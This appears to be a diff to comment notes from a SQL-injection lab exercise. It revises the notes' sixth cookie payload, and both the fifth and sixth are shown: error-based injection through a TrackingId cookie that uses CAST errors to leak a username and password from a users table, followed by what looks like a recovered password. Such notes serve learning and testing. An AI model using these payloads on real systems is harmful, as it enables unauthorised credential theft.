@@ -15,6 +15,6 @@
 
 5) Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users limit 1)AS INT)--
 
-6) Cookie: TrackingId='||CAST((SELECT password FROM users limit 1) AS INT)--
+6) Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users limit 1) AS INT)--
 idj2lklyk4diev29v2hp
 */
